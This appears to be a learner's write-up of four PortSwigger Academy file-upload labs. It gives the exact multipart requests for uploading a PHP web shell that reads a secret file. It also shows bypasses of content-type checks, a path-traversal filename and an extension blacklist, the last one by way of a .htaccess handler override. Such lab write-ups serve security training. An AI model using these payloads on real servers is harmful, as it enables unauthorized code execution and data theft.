
# Lab 1

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
## Solution

Login as user `wiener` then upload a profile picture while intercepting the request. Change picture details with:

```
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: application/octet-stream

<?php
echo file_get_contents("/home/carlos/secret");
?>
```

then send GET to:

```
/files/avatars/test.php
```

which shows contents of the secret file. Copy the contents to the submit field to finish the lab.


# Lab 2

## Description

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution


Same as lab 1 but the `content-type` is restricted. Using permitted `content-type` with:

```
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: image/jpeg

<?php
echo file_get_contents("/home/carlos/secret");
?>
```

bypasses the restriction while still executing.


# Lab 3

## Description

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Same as the labs before. However, the files don't execute inside `/files/avatars/`. Using a path traversal vuln while uploading:

```
Content-Disposition: form-data; name="avatar"; filename="..%2ftest.php"
Content-Type: application/octet-stream

<?php
echo file_get_contents("/home/carlos/secret");
?>
```

The file gets uploaded one file directory up and can be accessed via:

```
GET /files/test.php
```

Which displays the code that when submitted solves the challenge.


# Lab 4

## Description

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`


## Solution

As before, track down the profile picture upload, then intercept with burp. Changing the file extension to `.php` with:

```
[...]
------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: application/octet-stream

<?php
echo "hello";
?>
[...]
```

results in:

```
Sorry, php files are not allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Trying with:

```
[...]
filename="test.php.jpeg"
[...]
```

Works but doesn't execute:

```
GET /files/avatars/test.php.jpeg
```

returns:

```
<?php
echo "hello";
?>
```

Looked the solution up and it's **VERY INTERESTING STUFF!**.

First off, change `filename` value in the POST request to `.htaccess`. Change `Content-type` to `text/plain`. Finally, replace the content of the php payload to:

```
AddType application/x-httpd-php .l33t
```

the final request looks like this:

```
POST /my-account/avatar HTTP/2
Host: 0a9a009503ec0c4e8281348a008900b4.web-security-academy.net
[...]

------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="csrf"

SHqgvLz1QxhQO01kGBTpJVsEFCqFGVIU
------WebKitFormBoundary1uobcv2428uf0qZX--
```

the server responds with:

```
The file avatars/.htaccess has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Now the second phase, take the payload from before and change the file extension from `.php` to `.l33t`:

```
[...]
------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="avatar"; filename="test.l33t"
Content-Type: application/octet-stream

<?php
echo "hello";
?>
------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary1uobcv2428uf0qZX
Content-Disposition: form-data; name="csrf"

SHqgvLz1QxhQO01kGBTpJVsEFCqFGVIU
------WebKitFormBoundary1uobcv2428uf0qZX--

```

the upload is successful. Now changing the payload to read the file contents results in:

```
[...]
hp24kWWMTIwkWwQPEONIbbgPRLaKX1So
```

Submitting this value solve the lab.